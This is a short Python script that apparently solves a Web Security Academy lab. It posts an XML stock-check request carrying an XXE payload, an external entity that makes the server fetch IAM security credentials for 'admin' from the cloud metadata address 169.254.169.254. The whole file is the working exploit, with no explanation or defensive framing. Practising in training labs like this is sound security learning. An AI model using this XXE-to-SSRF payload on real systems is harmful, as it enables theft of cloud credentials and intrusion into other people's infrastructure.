import requests
s = requests.Session()

stock_url = 'https://ac971f7a1f14f7df80eb616200240073.web-security-academy.net/product/stock'
xml_post_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

resp = s.post(stock_url,data=xml_post_data)
print(resp.text)